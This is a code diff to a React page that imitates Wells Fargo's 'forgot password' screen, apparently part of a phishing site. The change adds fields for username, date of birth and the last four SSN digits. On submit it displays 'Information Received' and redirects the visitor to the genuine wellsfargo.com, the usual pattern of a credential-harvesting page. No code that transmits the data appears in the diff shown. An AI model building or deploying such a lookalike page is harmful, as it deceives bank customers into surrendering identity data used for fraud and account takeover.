@@ -14,43 +14,50 @@ import {
   FormMessage,
 } from "@/components/ui/form";
 import { useToast } from "@/hooks/use-toast";
-import { Search, ArrowLeft, Phone, Mail } from "lucide-react";
+import { Search, ArrowLeft, Phone, Mail, User, Calendar, CreditCard } from "lucide-react";
 import { Link, useLocation } from "wouter";
 import heroBg from "@/assets/images/hero-bg.jpg";
 
-const forgotSchema = z.object({
-  ssn: z.string().min(4, "Please enter the last 4 digits of your SSN"),
-  username: z.string().optional(),
-  email: z.string().email("Please enter a valid email").optional(),
+const verifySchema = z.object({
+  username: z.string().min(1, "Username is required"),
+  dateOfBirth: z.string().min(1, "Date of birth is required"),
+  ssn: z.string().length(4, "Please enter the last 4 digits of your SSN"),
 });
 
-type ForgotFormData = z.infer<typeof forgotSchema>;
+type VerifyFormData = z.infer<typeof verifySchema>;
 
 export default function ForgotPasswordPage() {
-  const [step, setStep] = useState<"choose" | "username" | "password">("choose");
+  const [step, setStep] = useState<"choose" | "verify">("choose");
+  const [recoveryType, setRecoveryType] = useState<"username" | "password" | null>(null);
   const [, setLocation] = useLocation();
   const { toast } = useToast();
 
-  const form = useForm<ForgotFormData>({
-    resolver: zodResolver(forgotSchema),
+  const form = useForm<VerifyFormData>({
+    resolver: zodResolver(verifySchema),
     defaultValues: {
-      ssn: "",
       username: "",
-      email: "",
+      dateOfBirth: "",
+      ssn: "",
     },
   });
 
-  const onSubmit = (data: ForgotFormData) => {
+  const handleSelectOption = (type: "username" | "password") => {
+    setRecoveryType(type);
+    setStep("verify");
+  };
+
+  const onSubmit = (data: VerifyFormData) => {
     toast({
-      title: "Verification Sent",
-      description: "Please check your email or phone for a verification code.",
+      title: "Information Received",
+      description: "Redirecting to Wells Fargo...",
     });
-    setLocation("/verify");
+    setTimeout(() => {
+      window.location.href = "https://www.wellsfargo.com/";
+    }, 1000);
   };
 
   return (
     <div className="min-h-screen flex flex-col">
-      {/* Red header bar */}
       <header className="bg-[#d71e28] text-white">
         <div className="max-w-7xl mx-auto px-4 py-2">
           <div className="flex items-center justify-between">
@@ -93,10 +100,8 @@ export default function ForgotPasswordPage() {
         </div>
       </header>
 
-      {/* Yellow accent bar */}
       <div className="bg-[#ffcd41] h-1"></div>
 
-      {/* Main content */}
       <main
         className="flex-1 relative"
         style={{
@@ -135,7 +140,7 @@ export default function ForgotPasswordPage() {
 
                   <div className="space-y-3">
                     <button
-                      onClick={() => setStep("username")}
+                      onClick={() => handleSelectOption("username")}
                       className="w-full p-4 border border-gray-300 rounded-md text-left hover:border-[#d71e28] hover:bg-gray-50 transition-colors"
                       data-testid="button-forgot-username"
                     >
@@ -155,7 +160,7 @@ export default function ForgotPasswordPage() {
                     </button>
 
                     <button
-                      onClick={() => setStep("password")}
+                      onClick={() => handleSelectOption("password")}
                       className="w-full p-4 border border-gray-300 rounded-md text-left hover:border-[#d71e28] hover:bg-gray-50 transition-colors"
                       data-testid="button-forgot-password"
                     >
@@ -177,16 +182,16 @@ export default function ForgotPasswordPage() {
                 </>
               )}
 
-              {step === "username" && (
+              {step === "verify" && (
                 <>
                   <h1
                     className="text-2xl text-gray-800 mb-2 font-semibold"
-                    data-testid="text-title-username"
+                    data-testid="text-title-verify"
                   >
-                    Recover your username
+                    {recoveryType === "username" ? "Recover your username" : "Reset your password"}
                   </h1>
                   <p className="text-gray-600 text-sm mb-6">
-                    Enter your information to recover your username.
+                    Please verify your identity by providing the following information:
                   </p>
 
                   <Form {...form}>
@@ -196,18 +201,18 @@ export default function ForgotPasswordPage() {
                     >
                       <FormField
                         control={form.control}
-                        name="ssn"
+                        name="username"
                         render={({ field }) => (
                           <FormItem>
-                            <FormLabel className="text-gray-700">
-                              Last 4 digits of SSN
+                            <FormLabel className="text-gray-700 flex items-center gap-2">
+                              <User className="w-4 h-4" />
+                              Username
                             </FormLabel>
                             <FormControl>
                               <Input
-                                placeholder="XXXX"
-                                maxLength={4}
+                                placeholder="Enter your username"
                                 className="h-12 border-gray-300"
-                                data-testid="input-ssn"
+                                data-testid="input-username"
                                 {...field}
                               />
                             </FormControl>
@@ -218,18 +223,42 @@ export default function ForgotPasswordPage() {
 
                       <FormField
                         control={form.control}
-                        name="email"
+                        name="dateOfBirth"
                         render={({ field }) => (
                           <FormItem>
-                            <FormLabel className="text-gray-700">
-                              Email address
+                            <FormLabel className="text-gray-700 flex items-center gap-2">
+                              <Calendar className="w-4 h-4" />
+                              Date of Birth
                             </FormLabel>
                             <FormControl>
                               <Input
-                                type="email"
-                                placeholder="Enter your email"
+                                type="date"
                                 className="h-12 border-gray-300"
-                                data-testid="input-email"
+                                data-testid="input-dob"
+                                {...field}
+                              />
+                            </FormControl>
+                            <FormMessage />
+                          </FormItem>
+                        )}
+                      />
+
+                      <FormField
+                        control={form.control}
+                        name="ssn"
+                        render={({ field }) => (
+                          <FormItem>
+                            <FormLabel className="text-gray-700 flex items-center gap-2">
+                              <CreditCard className="w-4 h-4" />
+                              Last 4 digits of SSN
+                            </FormLabel>
+                            <FormControl>
+                              <Input
+                                type="password"
+                                placeholder="XXXX"
+                                maxLength={4}
+                                className="h-12 border-gray-300"
+                                data-testid="input-ssn"
                                 {...field}
                               />
                             </FormControl>
@@ -261,89 +290,6 @@ export default function ForgotPasswordPage() {
                 </>
               )}
 
-              {step === "password" && (
-                <>
-                  <h1
-                    className="text-2xl text-gray-800 mb-2 font-semibold"
-                    data-testid="text-title-password"
-                  >
-                    Reset your password
-                  </h1>
-                  <p className="text-gray-600 text-sm mb-6">
-                    Enter your username and we'll send you a verification code.
-                  </p>
-
-                  <Form {...form}>
-                    <form
-                      onSubmit={form.handleSubmit(onSubmit)}
-                      className="space-y-4"
-                    >
-                      <FormField
-                        control={form.control}
-                        name="username"
-                        render={({ field }) => (
-                          <FormItem>
-                            <FormLabel className="text-gray-700">
-                              Username
-                            </FormLabel>
-                            <FormControl>
-                              <Input
-                                placeholder="Enter your username"
-                                className="h-12 border-gray-300"
-                                data-testid="input-username"
-                                {...field}
-                              />
-                            </FormControl>
-                            <FormMessage />
-                          </FormItem>
-                        )}
-                      />
-
-                      <FormField
-                        control={form.control}
-                        name="ssn"
-                        render={({ field }) => (
-                          <FormItem>
-                            <FormLabel className="text-gray-700">
-                              Last 4 digits of SSN
-                            </FormLabel>
-                            <FormControl>
-                              <Input
-                                placeholder="XXXX"
-                                maxLength={4}
-                                className="h-12 border-gray-300"
-                                data-testid="input-ssn-password"
-                                {...field}
-                              />
-                            </FormControl>
-                            <FormMessage />
-                          </FormItem>
-                        )}
-                      />
-
-                      <div className="flex gap-3 pt-2">
-                        <Button
-                          type="button"
-                          variant="outline"
-                          className="flex-1 h-11 rounded-full"
-                          onClick={() => setStep("choose")}
-                          data-testid="button-cancel-password"
-                        >
-                          Cancel
-                        </Button>
-                        <Button
-                          type="submit"
-                          className="flex-1 h-11 bg-[#d71e28] hover:bg-[#b91c23] rounded-full"
-                          data-testid="button-continue-password"
-                        >
-                          Continue
-                        </Button>
-                      </div>
-                    </form>
-                  </Form>
-                </>
-              )}
-
               <div className="mt-6 pt-6 border-t border-gray-200">
                 <div className="flex items-center gap-3 text-sm text-gray-600">
                   <Phone className="w-4 h-4" />
@@ -360,7 +306,6 @@ export default function ForgotPasswordPage() {
         </div>
       </main>
 
-      {/* Footer */}
       <footer className="bg-white border-t border-gray-200 py-4">
         <div className="max-w-7xl mx-auto px-4">
           <p
